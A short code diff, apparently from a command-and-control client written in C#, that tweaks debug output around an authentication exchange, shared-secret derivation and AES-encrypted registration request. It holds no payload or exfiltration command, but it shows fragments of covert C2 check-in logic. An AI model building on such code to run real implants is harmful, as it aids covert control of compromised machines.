@@ -58,7 +58,9 @@ var authRequest = new C2Request
 };
 
 var authResponse = baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(authRequest));
+// TEMP
 Console.WriteLine(authResponse.Result);
+//
 var decodedAuthResponse = JsonSerializer.Deserialize<AuthenticationResponse>(authResponse.Result);
 
 var peerPublicKey = Convert.FromBase64String(decodedAuthResponse.PublicKey);
@@ -87,11 +89,6 @@ var registerRequest = new C2Request
 };
 
 var encryptedRegisterRequestMessage = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(registerRequest), Convert.ToBase64String(sharedSecret));
-
-// TODO: Need to fix the secret key gen to match server
-string secretByteString = "[" + string.Join(" ", sharedSecret.Select(b => b.ToString())) + "]";
-Console.WriteLine("Secret: " + secretByteString);
-Console.WriteLine(encryptedRegisterRequestMessage);
 
 // Init contact request
 var registrationResult = await baseCommunicationService.SimplePostAsync("/", encryptedRegisterRequestMessage);
